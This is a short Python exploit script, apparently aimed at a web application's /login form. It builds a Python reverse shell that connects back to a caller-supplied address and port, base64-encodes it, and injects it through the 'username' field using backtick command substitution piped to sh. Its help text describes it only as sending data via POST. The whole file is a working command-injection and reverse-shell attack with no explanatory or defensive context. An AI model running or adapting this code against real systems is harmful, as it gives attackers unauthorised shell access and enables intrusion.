import argparse
import requests
import base64

def send_data(local_address, local_port, remote_url):
    
    # modify this to what is required for the situation
    command = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{local_address}",{local_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'"""

    # convert payload to base64
    encoded_bytes = command.encode('utf-8')
    base64_bytes = base64.b64encode(encoded_bytes)
    encoded_command = base64_bytes.decode('utf-8')

    # craft the 'user' portion of the data
    payload = f';`echo+\\"' + encoded_command + '\\"+|+base64+-d+|+sh`'

    # craft the data to be sent
    data = f"username={payload}"

    response = requests.post(f"{remote_url}/login", data=data)
    
    if response.status_code == 401:
        print("Data sent successfully!")
        print(f"Message from server: {response.content.decode()}")
        if response.content.decode() == "Login failed":
            print(f"'Login failed' recived.. check the remote IP!")
    else:
        print("Failed to send execute payload. Status code:", response.status_code)

def main():
    parser = argparse.ArgumentParser(description="Send data via POST to a remote URL")
    parser.add_argument("local_address", help="Local address to send")
    parser.add_argument("local_port", type=int, help="Local port number")
    parser.add_argument("remote_url", help="Remote URL to send data to")
    
    args = parser.parse_args()
    send_data(args.local_address, args.local_port, args.remote_url)

if __name__ == "__main__":
    main()
